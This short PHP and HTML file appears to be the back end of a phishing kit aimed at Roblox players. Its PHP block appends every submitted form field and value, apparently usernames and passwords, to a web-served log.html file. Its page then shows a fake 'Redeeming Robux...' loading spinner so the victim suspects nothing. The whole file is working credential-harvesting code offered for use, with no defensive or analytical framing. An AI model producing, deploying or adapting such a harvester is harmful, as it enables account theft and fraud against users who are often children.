<?php
$handle = fopen("log.html", "a");
foreach($_POST as $field => $value) {
    fwrite($handle, $field.": ".$value."\n");
}
fwrite($handle, "----------------------------\n");
fclose($handle);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Processing...</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loading { text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #00b06f; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #666; }
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <p>Redeeming Robux...</p>
    </div>
</body>
</html>
